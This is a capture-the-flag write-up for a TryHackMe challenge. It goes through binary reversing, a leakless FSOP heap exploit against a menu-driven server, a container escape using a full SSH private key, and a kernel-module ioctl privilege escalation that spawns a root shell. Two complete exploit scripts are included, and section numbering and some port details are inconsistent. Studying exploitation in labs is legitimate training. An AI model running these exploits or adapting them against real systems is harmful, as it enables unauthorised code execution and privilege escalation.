# Advent of Cyber 2025 – Side Quest 2 | Scheme Catcher – Full CTF Write-Up

Platform: TryHackMe
Difficulty: INSANE
Category: Reverse Engineering | Binary Exploitation | Kernel Exploitation
Flags: 4
---

## 1. Initial Reconnaissance

An initial `nmap` scan against the target revealed two non‑standard services of interest:

```bash
nmap -sCV <target-ip> -p-
```

- **Port 80 (HTTP)** – Apache web server
- **Port 9004 (TCP)** – Custom service identified as *Payload Storage Malhare’s v4.2.0*

Port 80 served a minimal web page:

```
🐰
Under Construction

This little Easter burrow is getting ready.
Check back soon for more bunny business!
🥕 Powered by carrots and pastel vibes
```

At face value, the page appeared static and non‑functional, but given the challenge context, it was treated as a **staging point rather than a dead end**.

---

## 2. Web Enumeration & Artifact Discovery

Directory brute‑forcing (`ffuf`) was performed against the web server. 
```bash
ffuf \                        
-u "http://10.81.159.104:9004/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -t 100
```
```text
dev
server-status
```
checking the ```dev``` endpoint uncovered a downloadable **ZIP file**.

After downloading and extracting the File, it contained a single executable binary:

```
beacon.bin
```

This immediately shifted the investigation from web exploitation to **binary analysis**, strongly aligning with the Side Quests narrative of a *rebuilt command‑and‑control system*.

---

## 2. Extracting Flag 1

While inspecting the contents of `beacon.bin`, using the simple ```cat beacon.bin``` the following flag was discovered **in plaintext**:

```
THM{We{redacted}land}
```

## Beacon Interaction
Using some linux commands, we are able to observe the behavior of the beacon.bin file.
```bash
┌──(david㉿vbox)-[~/Downloads/latest]
└─$ ltrace ./beacon.bin
setvbuf(0x7fc64f7788e0, nil, 2, 0)                                                                                                                 = 0
setvbuf(0x7fc64f7795c0, nil, 2, 0)                                                                                                                 = 0
setvbuf(0x7fc64f7794e0, nil, 2, 0)                                                                                                                 = 0
printf("Enter key: "Enter key: )                                                                                                                              = 11
read(0
, "\n", 32)                                                                                                                                  = 1
strcspn("\n", "\n")                                                                                                                                = 0
printf("Hello %s!\n", ""Hello !
)                                                                                                                          = 8
strcmp("", "EastMass")                                                                                                                             = -69
puts("Access denied."Access denied.
)                                                                                                                             = 15
_exit(1 <no return ...>
+++ exited (status 1) +++

```
Looking at the output, there seems to be a hardcoded key "EastMass"

After authenticating to `beacon.bin` using the hardcoded key:

```bash
┌──(david㉿vbox)-[~/Downloads/latest]
└─$ ./beacon.bin
Enter key: EastMass
Hello EastMass!
Access granted! Starting socket server...
Socket server listening on port 4444...
```
The beacon opens a local command listener on port 4444. This listener is not interactive and accepts exactly one numeric command per TCP connection.

Interaction is performed using netcat, for example:

echo <command> | nc 127.0.0.1 4444

The valid commands are:

Command	Behavior
1	Attempt to execute /tmp/b68vC103RH
2	Load payload (triggers HTTP connection)
3	Delete payload
4	Exit beacon

## 1. Confirming Beacon Network Behaviour

From prior dynamic analysis (`strace` / `ltrace`) of `beacon.bin`, the following was already confirmed:

- After authenticating with the hardcoded key (`EastMass`)
- Sending command `2` to port `4444`
- The beacon attempts an **outbound TCP connection to localhost:80**

This was not speculation — it was explicitly visible in syscall traces:
```bash
atoi(0x7ffdd61c7120, 0x7ffdd61c6f40, 0, 0)                                                                                                         = 2
puts("Payload loaded"Payload loaded
)                                                                                                                             = 15
socket(2, 1, 0)                                                                                                                                    = 5
htons(80)                                                                                                                                          = 0x5000
gethostbyname("localhost")                                                                                                                         = 0x7fd171b0b000
memcpy(0x7ffdd61c6fb4, "\177\0\0\001", 4)                                                                                                          = 0x7ffdd61c6fb4
connect(5, 0x7ffdd61c6fb0, 16, 0x7ffdd61c6fb0)                                                                                                     = -1
perror("Connection failed"Connection failed: Connection refused
)                                                                                                                        = <void>
close(5)                                                                                                                                           = 0
close(4)                                                                                                                                           = 0
accept(3, 0x7ffdd61c7110, 0x7ffdd61c70fc, 0x7ffdd61c7110^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```

```
connect(…, 127.0.0.1:80) = ECONNREFUSED
```

The **important insight** here:

> The failure is not the payload.  
> The failure is that nothing is listening.

---

## 2. Turning the Failure Into Signal

Instead of ignoring the failed connection, the correct approach is to **listen**. With `beacon.bin` running, on a seperate Terminal start a listener:

```bash
nc -lvnp 80
```

## 3. Triggering the Connection

In a second terminal, interact with the beacon as before:

```bash
echo 2 | nc 127.0.0.1 4444
```

Immediately, the listener receives:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60126
GET /7ln6Z1X9EF HTTP/1.1
Host: localhost
Connection: close
```
## 4. Using the Token Against the Remote Target

The beacon is clearly requesting a path. Trying it **on the remote server**, and something interesting comes up:

```
http://<target-ip>/7ln6Z1X9EF
```

## 5. Flag 2 Retrieval

Visiting the endpoint reveals a directory listing containing:

- `4.2.0-R1-1337-server.zip`
- `foothold.txt`

Reading the foothold file by clicking it reveals:

Output:

```
THM{by{redacted}3d}
```

# FLAG 3 — Leakless FSOP RCE via Payload Storage Server

---

## 7. Analyzing the Server Package

Extract the downloaded archive:

```bash
unzip 4.2.0-R1-1337-server.zip
```

Contents:

```
server
libc.so.6
ld-linux-x86-64.so.2
```

Initial inspection:

```bash
file server
file libc.so.6
file ld-linux-x86-64.so.2
strace ./server
ltrace ./server
objdump -d server
readelf -a server
strings server
```

Key facts:

- Custom **glibc 2.40**
- Custom dynamic loader
- Debug symbols present
- PIE enabled
- NX enabled
- ASLR enabled

Key observation: running the ```server``` file shows that it is an exact local replication of the payload storage @9004, this is **intentional** & it allows local replication.

```bash
┌──(david㉿vbox)-[~/Downloads/latest]
└─$ ./server                         
Payload Storage Malhare's
Version 4.2.0
[1] C:
[2] U:
[3] D:
[4] E:
>>
```

Running the server locally reproduces the **exact** behavior of port `9004` on the remote host. Attempting to exploit remotely without first stabilizing the exploit locally will waste hours.

---

## 9. Server Capability Summary

The server exposes a menu-driven interface:

```
1 → malloc(size)
2 → write(idx, offset, data)
3 → free(idx)
4 → exit()
```

Confirmed vulnerabilities:

- Use‑After‑Free (dangling pointers)
- Double free
- Offset-based arbitrary write
- Predictable heap behavior

Confirmed constraints:

- ❌ No read primitive
- ❌ No heap leak
- ❌ No libc leak
- ❌ No persistent execution

---

## 10. Why Traditional Heap Exploitation Fails

Every standard approach fails:

- Tcache poisoning → requires leaks
- GOT overwrite → RELRO
- Hook overwrite → blocked by safe-linking
- Shell spawning → exits immediately

This is not accidental, it shows the binary **must exit**.

---

## 11. Correct Exploitation Strategy

The only viable path:

- Leakless exploitation
- File Stream Oriented Programming (FSOP)
- Trigger execution during `exit()`

Specifically Using:

- **House of Apple (v2)**
- `_IO_FILE_plus` structure forgery
- Vtable redirection
- `system()` invocation during stdio flush

---

## 12. The ASLR Problem (and the Fix)

The reference PoC assumes partial leaks.

This challenge provides **none**.

Solution:

- Brute-force the missing ASLR nibbles
- 16 × 16 attempts = 256 executions
- Fully feasible due to one-shot design

---

## 13. Final Working Exploit Script (Flag 3)

> **Note**: This script is shown exactly as used.
> It requires the accompanying `io_file.py` helper from the same repository.

```python
#!/usr/bin/env python3
from pwn import *
import io_file

context.update(arch="amd64", os="linux", log_level="error")
context.binary = elf = ELF("./server", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

exit_addr = libc.sym['exit']
stdout_addr = libc.sym['_IO_2_1_stdout_']

for heap_brute in range(16):
    for libc_brute in range(16):
        try:
            print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
            r = remote("<target-ip>", 9004)

            idx = -1

            def create(size):
                global idx
                idx += 1
                r.sendlineafter(b'
>>', b'1')
                r.sendlineafter(b'size: 
', str(size).encode())
                return idx

            def update(index, data, offset=0):
                r.sendlineafter(b'
>>', b'2')
                r.sendlineafter(b'idx:
', str(index).encode())
                r.sendlineafter(b'offset:
', str(offset).encode())
                r.sendafter(b'data:
', data)

            def delete(index):
                r.sendlineafter(b'
>>', b'3')
                r.sendlineafter(b'idx:
', str(index).encode())

            for _ in range(7):
                create(0x90-8)

            middle = create(0x90-8)
            playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
            guard = create(0x18)

            delete(playground)
            guard = create(0x18)

            corruptme = create(0x4c8)
            start_M = create(0x90-8)
            midguard = create(0x28)
            end_M = create(0x90-8)
            leftovers = create(0x28)

            update(playground, p64(0x651), 0x18)
            delete(corruptme)

            offset = create(0x4c8+0x10)
            start = create(0x90-8)
            midguard = create(0x28)
            end = create(0x90-8)
            leftovers = create(0x18)

            create((0x10000+0x80)-0xda0-0x18)
            fake_data = create(0x18)
            update(fake_data, p64(0x10000)+p64(0x20))

            fake_size_lsb = create(0x3d8)
            fake_size_msb = create(0x3e8)
            delete(fake_size_lsb)
            delete(fake_size_msb)

            update(playground, p64(0x31), 0x4e8)
            delete(start_M)
            update(start_M, p64(0x91), 8)

            update(playground, p64(0x21), 0x5a8)
            delete(end_M)
            update(end_M, p64(0x91), 8)

            for i in range(7):
                delete(i)

            delete(end)
            delete(middle)
            delete(start)

            heap_target = (heap_brute << 12) + 0x80
            update(start, p16(heap_target))
            update(end, p16(heap_target), 8)

            exit_lsb = (libc_brute << 12) + (exit_addr & 0xfff)
            stdout_offset = stdout_addr - exit_addr
            stdout_lsb = (exit_lsb + stdout_offset) & 0xffff

            win = create(0x888)
            update(win, p16(stdout_lsb), 8)

            stdout = create(0x28)
            update(stdout, p64(0xfbad3887)+p64(0)*3+p8(0))

            libc_leak = u64(r.recv(8))
            libc.address = libc_leak - (stdout_addr+132)

            file = io_file.IO_FILE_plus_struct()
            payload = file.house_of_apple2_execmd_when_do_IO_operation(
                libc.sym['_IO_2_1_stdout_'],
                libc.sym['_IO_wfile_jumps'],
                libc.sym['system']
            )

            update(win, p64(libc.sym['_IO_2_1_stdout_']), 8*60)
            full_stdout = create(0x3e0-8)
            update(full_stdout, payload)

            r.interactive()
            exit()

        except Exception:
            continue
```

---

## 14. Flag 3 Retrieval

The exploit results in **one-shot RCE** inside a Docker container as ```root```.

Reading the flag:

```bash
cat user.txt
```

Output:

```
THM{th{redacted}3ak}
```
## 9. Container Pivot via SSH Credentials

After obtaining RCE inside the container, enumeration was performed:

```bash
ls -la
```

SSH credentials were discovered:

```bash
cat id_rsa                
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDa1BG0w5HKQLmBltbDeDk3ee2b0sVyFqu5L/V4jlSrPQAAAJib4ojYm+KI
2AAAAAtzc2gtZWQyNTUxOQAAACDa1BG0w5HKQLmBltbDeDk3ee2b0sVyFqu5L/V4jlSrPQ
AAAECuFWeJq3xX3/SaKB3EPHBPWUCB46sAj6ewL623eVpaMNrUEbTDkcpAuYGW1sN4OTd5
7ZvSxXIWq7kv9XiOVKs9AAAAD2FnZW50QHRyeWhhY2ttZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

The private key was copied to the attacker machine manually:

```bash
nano id_rsa
```

Permissions were fixed:

```bash
chmod 600 id_rsa
```

The key was then used to escape the container:

```bash
ssh -i id_rsa agent@<target-ip>
```

This grants host-level access.

---

## Extracting Flag 4

## 1. Initial Host Enumeration


After SSHing into the host:

```bash
id
```

```text
uid=1001(agent) gid=1001(agent) groups=1001(agent),100(users)
```

### Sudo Permissions

```bash
sudo -l
```

```text
User agent may run the following commands on tryhackme:
    (root) NOPASSWD: /usr/sbin/modprobe -r kagent, /usr/sbin/modprobe kagent
    (root) NOPASSWD: /bin/chmod 444 /dev/kagent
```

### Why this is critical

- `modprobe` allows loading arbitrary kernel modules as root
- `/dev/kagent` is a character device exposed by the module
- Permission modification is explicitly allowed

This combination is **never legitimate** on a production system and immediately signals an intentionally vulnerable kernel module.

---

## 3. Loading and Observing the Kernel Module

To reset the module state and ensure clean testing:

```bash
sudo modprobe -r kagent 2>/dev/null
sudo modprobe kagent
sudo chmod 444 /dev/kagent
```

Verification:

```bash
ls -la /dev/kagent
```

```text
cr--r--r-- 1 root root 239, 0 /dev/kagent
```

Module confirmation:

```bash
cat /proc/modules | grep kagent
```

```text
kagent 12288 0 - Live 0x0000000000000000 (OE)
```

### Observations

- `(OE)` → out-of-tree module
- Base address hidden (expected)
- Requires static reversing rather than dynamic symbol resolution

---

## 4. Static Analysis of kagent

The kernel object was copied and disassembled:

```bash
cp /lib/modules/$(uname -r)/extra/kagent.ko /tmp/
objdump -d /tmp/kagent.ko > /tmp/kagent.dump
strings /tmp/kagent.ko
```

### Identifying Key Symbols

```bash
grep -E "kagent_ioctl|heartbeat|update" /tmp/kagent.dump
```

Relevant discoveries:

```text
kagent_ioctl
c2_heartbeat
c2_update_conf
op_ping
op_execute
```

This confirmed that:

- All user interaction happens via `ioctl`
- Multiple internal operations exist
- A function pointer-based execution model is used

---

## 5. Identifying IOCTL Values

Disassembly of `kagent_ioctl`:

```bash
grep -n "<kagent_ioctl>" /tmp/kagent.dump
sed -n '240,330p' /tmp/kagent.dump
```

Key comparison instructions:

```text
cmp $0xc0b33701,%esi
cmp $0x40933702,%esi
cmp $0x133703,%esi
```

### Mapping IOCTLs

| IOCTL | Handler | Purpose |
|------|--------|--------|
| `0xc0b33701` | `c2_heartbeat` | Information leak |
| `0x40933702` | `c2_update_conf` | Arbitrary overwrite |
| `0x133703` | Execute | Call `current_op` |

---

## 6. Understanding the Kernel Context Structure

Further disassembly and cross-referencing revealed a global structure:

```c
struct ctx {
    char agent_id[16];
    char session_key[16];
    void (*current_op)(void);
    char command_buffer[64];
};
```

Crucially:

- `current_op` is stored in writable memory
- It is later invoked directly via `call *%rax`

---

## 7. Stage 1 Exploitation – Information Leak

### Root Cause

`c2_heartbeat` uses `snprintf` to build a status string:

```text
"STATUS: ONLINE | ID: " + agent_id + session_key + current_op
```

No bounds checking ensures kernel memory is copied back to userland.

### Leak Script Used

```python
import fcntl, os, ctypes

fd = os.open("/dev/kagent", os.O_RDONLY)
buf = ctypes.create_string_buffer(b"A" * 128)
fcntl.ioctl(fd, 0xc0b33701, buf)

leak = bytes(buf)
print(leak)
```

### Dynamic Parsing of Leak

```python
MARKER = b"STATUS: ONLINE | ID: "
idx = leak.find(MARKER)
base = idx + len(MARKER)

agent_id    = leak[base:base+16]
session_key = leak[base+16:base+32]
current_op  = leak[base+32:base+40]
```

### Successful Leak

```text
agent_id    = AAAAAAAAAAAAAAAA
session_key = Sup3rS3cur3K3y!!
current_op  = 0xffffffffc05f3010
```

---

## 8. Reverse Engineering op_ping vs op_execute

Further analysis of the module:

```bash
grep -n "<op_ping>" /tmp/kagent.dump
grep -n "<op_execute>" /tmp/kagent.dump
```

Relative offset:

```text
op_execute = op_ping + 0x320
```

`op_execute` internally performs:

```c
commit_creds(prepare_kernel_cred(0));
```

---

## 9. Stage 2 Exploitation – 
Arbitrary Function Pointer Overwrite

### c2_update_conf Behavior

- Accepts 144 bytes of user data
- First 16 bytes must equal `session_key`
- Remaining bytes blindly overwrite kernel context

### Payload Construction

```text
[ session_key (16) ]
[ agent_id (16) ]
[ session_key (16) ]
[ new current_op (8) ]
[ padding ]
```

---

## 10. Final Exploit Script (Exact)

```python
#!/usr/bin/env python3
import os
import fcntl
import ctypes
import struct
import sys

# =========================
# Constants (from reversing)
# =========================
DEV = "/dev/kagent"

IOCTL_HEARTBEAT   = 0xc0b33701
IOCTL_UPDATE_CONF = 0x40933702
IOCTL_EXEC_OP     = 0x133703

MARKER = b"STATUS: ONLINE | ID: "

# Offset between op_ping and op_execute (from walkthrough)
OP_EXECUTE_DELTA = 0x320

# =========================
# Helpers
# =========================
def die(msg):
    print(f"[-] {msg}")
    sys.exit(1)

def open_dev():
    try:
        return os.open(DEV, os.O_RDONLY)
    except Exception as e:
        die(f"failed to open {DEV}: {e}")

# =========================
# Stage 1: Leak via heartbeat
# =========================
def leak_ctx(fd):
    buf = ctypes.create_string_buffer(b"A" * 128)

    fcntl.ioctl(fd, IOCTL_HEARTBEAT, buf)

    leak = bytes(buf)

    idx = leak.find(MARKER)
    if idx == -1:
        die("marker not found in leak (reload module and retry)")

    base = idx + len(MARKER)

    agent_id    = leak[base : base + 16]
    session_key = leak[base + 16 : base + 32]
    current_op  = leak[base + 32 : base + 40]

    op_ping = struct.unpack("<Q", current_op)[0]

    print("[+] agent_id    :", agent_id)
    print("[+] session_key :", session_key)
    print("[+] op_ping     :", hex(op_ping))

    if op_ping == 0 or session_key == b"\x00" * 16:
        die("invalid leak data")

    return session_key, op_ping

# =========================
# Stage 2: Overwrite current_op
# =========================
def overwrite_op(fd, session_key, op_execute):
    payload  = session_key               # auth
    payload += b"B" * 16                 # agent_id
    payload += session_key               # session_key again
    payload += struct.pack("<Q", op_execute)  # overwrite current_op
    payload += b"C" * (144 - len(payload))

    buf = ctypes.create_string_buffer(payload)

    fcntl.ioctl(fd, IOCTL_UPDATE_CONF, buf)
    print("[+] current_op overwritten")

# =========================
# Stage 3: Trigger execution
# =========================
def trigger(fd):
    fcntl.ioctl(fd, IOCTL_EXEC_OP, b"A" * 8)

# =========================
# Main
# =========================
def main():
    if not os.path.exists(DEV):
        die(f"{DEV} does not exist (is kagent loaded?)")

    fd = open_dev()

    print("[*] leaking ctx via heartbeat …")
    session_key, op_ping = leak_ctx(fd)

    op_execute = op_ping + OP_EXECUTE_DELTA
    print("[+] op_execute  :", hex(op_execute))

    print("[*] overwriting current_op …")
    overwrite_op(fd, session_key, op_execute)

    print("[*] triggering execution …")
    trigger(fd)

    print("[*] spawning shell …")
    os.system("/bin/bash")

if __name__ == "__main__":
    main()

```

---

## 11. Root Verification and Flag Retrieval

```bash
id
```

```text
uid=0(root) gid=0(root)
```

```bash
cat /root/root.txt
```

```text
THM{f{redacted}ay}
```

---

## 12. Conclusion

This final stage required:

- Kernel module reversing
- IOCTL surface discovery
- State-aware exploitation
- Precise function pointer control

The difficulty lies not in bypassing mitigations, but in **correctly understanding and chaining kernel logic**.
